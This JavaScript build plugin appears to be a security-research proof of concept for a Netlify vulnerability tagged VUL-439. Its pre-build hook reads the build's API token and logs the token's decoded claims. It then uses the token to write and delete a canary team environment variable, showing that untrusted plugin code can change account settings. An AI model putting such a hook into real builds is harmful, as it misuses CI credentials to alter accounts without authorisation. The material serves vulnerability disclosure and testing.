// VUL-439 build-token probe. Runs inside the build to show what an untrusted
// fork-PR plugin can reach. Benign by design:
//   - prints token length + decoded claims only, never the token value
//   - writes a single namespaced canary env var, then deletes it
//   - talks only to api.netlify.com
const decodeClaims = (jwt) => {
  try {
    const [, body] = String(jwt).split('.')
    return JSON.parse(Buffer.from(body, 'base64url').toString())
  } catch {
    return '<not a JWT>'
  }
}

export const onPreBuild = async ({ constants }) => {
  const token = constants.NETLIFY_API_TOKEN
  const host = constants.NETLIFY_API_HOST || 'api.netlify.com'
  const siteId = constants.SITE_ID
  const accountId = constants.ACCOUNT_ID

  console.log('[VUL439] ===== build-token probe =====')
  console.log('[VUL439] context       =', process.env.CONTEXT)
  console.log('[VUL439] token present =', Boolean(token), 'len =', token ? token.length : 0)
  console.log('[VUL439] token claims  =', JSON.stringify(decodeClaims(token)))

  if (!token || !accountId || !siteId) {
    console.log('[VUL439] missing token/accountId/siteId; cannot probe env-var write')
    return
  }

  // Finding A: can this build token WRITE a team env var? Benign canary only.
  const key = 'VUL439_BUILD_CANARY'
  const url = `https://${host}/api/v1/accounts/${accountId}/env/${key}?site_id=${siteId}`

  try {
    const write = await fetch(url, {
      method: 'PATCH',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ context: 'all', value: 'vul439-canary-written-by-build-token' }),
    })
    console.log('[VUL439] env-var PATCH status =', write.status, '(200 => build token CAN write team env vars)')

    // Always clean up so nothing persists, regardless of write result.
    const del = await fetch(url, { method: 'DELETE', headers: { Authorization: `Bearer ${token}` } })
    console.log('[VUL439] canary env var cleanup status =', del.status)
  } catch (err) {
    console.log('[VUL439] env-var probe error =', err.message)
  }
  console.log('[VUL439] ===== end build-token probe =====')
}
